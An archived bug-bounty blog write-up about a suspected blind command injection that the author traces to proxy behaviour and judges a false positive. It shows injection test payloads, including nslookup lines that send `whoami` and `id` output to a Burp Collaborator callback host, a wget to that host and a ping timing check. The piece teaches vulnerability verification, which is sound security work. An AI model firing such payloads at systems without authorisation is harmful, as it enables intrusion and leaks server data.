# Blind Command Injection Leads to Nothing!!

- **Source URL:** https://medium.com/@kush.kira/blind-command-injection-leads-to-nothing-ea56f6662a58?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240918144848/https://medium.com/@kush.kira/blind-command-injection-leads-to-nothing-ea56f6662a58
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7111 (id 7111)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hey, bounty hunters hope you all doing great in hunting and securing the internet.

In this write-up, I’ll discuss a situation my friend [cyb3rD1vvy@](https://medium.com/u/966d93ea9894?source=post_page-----ea56f6662a58--------------------------------) made me came across on Blind Command Injection and what new you will get to learn after reading this writeup is to verify weather it is a true negative.

So what is **Command Injection**?

OS command injection allows an attacker to execute operating system (OS) commands on the server that is running an application.

And what is **Blind Command Injection**?

Well in blind command injection, the output of the executed command is not directly visible in the application’s response. But still may infer success or failure through various techniques like

- **Time-based Technique (Blind) \[ With a payload, \`*ping -c 10 127.0.0.1\` will do the work here.*\]**
- **File-based Technique (Semi-blind) \[This sorely depends on the application functionality and what the request is about, example of this scenario can be found** [**here**](https://portswigger.net/blog/unlock-enhanced-api-scanning-with-burp-suite)**\]**

Now about the Bug. This particular endpoint was a hunch tbh, does not depends on the functionality.

The request goes by like this and to confirm the user input is being passed in terminal a simple `wget`to the burp collaborator and if the burp collaborator got the it then we can confirm it.

So here we can confirm the vulnerability with the hit.

Next to show impact you we can simply print the `whoami` user to our burp collaborator; how?

Simply append do a nslookup along with the payload `` `whoami`.burpCollaborator ``

And we would get the hit of course but along with the `whoami`command.

You see the sting `izcmmczi74zuidh7jyqknp`right before the burp collaborator; that should be the result of whoami. This is enough to get $$$$ bounty.

But life is unfair and this is a false positive, knowing and analyzing about the bug will make you stand different.

Let me decode it for you;

- The hit we are getting is from the proxy server, look at the response header have `X-Cache: MISS TCP_MISS drin:-2:-2`which means proxy ofc. Also one unusual header `X-Swift-Error: orig response 4XX error`which kind of tells that from the original server we are getting 4XX error. \[**Still we can show impact here**\]

Note: We need only focus on the request who;s responce is`X-Cache: HIT` i.e from the original server.

- Tried nslookup command with `test.burpCollabrator` and got the hit; implies that the command is executed in terminal.

So far everything implies that this is a true negative.

Let’s move on the theory where it proves that this is false positive.

- Command `Sleep 10` does not halt server to respond back after 10 second; implies did not executed in terminal at all.

- Next tried print the `id` to our burp collaborator.

Simply append do a nslookup along with the payload `` `id`.burlCollabrator ``and NOPE, got the similar kind of sting and no `id`

Umm…and we have tried every other payload to check for Time-based but no luck. So it is confirm that this is not a command execution at all. Well then maybe next question is, why not report it as **SSRF**? if you thought so then good, you think like a hacker but sadly this also not a SSRF as well.

Definitely we are getting DNS and HTTP hit, so i tried two way to confirm my theory for SSRF here.

- Crafted a payload like `wget http://burpCollabrator/kira` and we should get the hit with the specified path.

Unfortunately did not get the hit with the path implies something fishy here.

- Next we tried to simply give the URL `path/session=fail;http://burpCollabrator`and see what happens, surprisingly we still got the hit; BUT WHY?

So the only reason we came up as **no blind command execution**, **no SSRF**. this is just a inheritance behavior of the functionality.

We are still looking more way to confirm or to find any kind of bug here also If you have some theory or any other testcase to confirm the existence of vulnerability then do pin me. Surly will workout on it.

I hope this article has taught you something new.

\_\_\_\_\_\_\_\_\_\_[*Kira*](https://twitter.com/kush_kira/) still hacking.
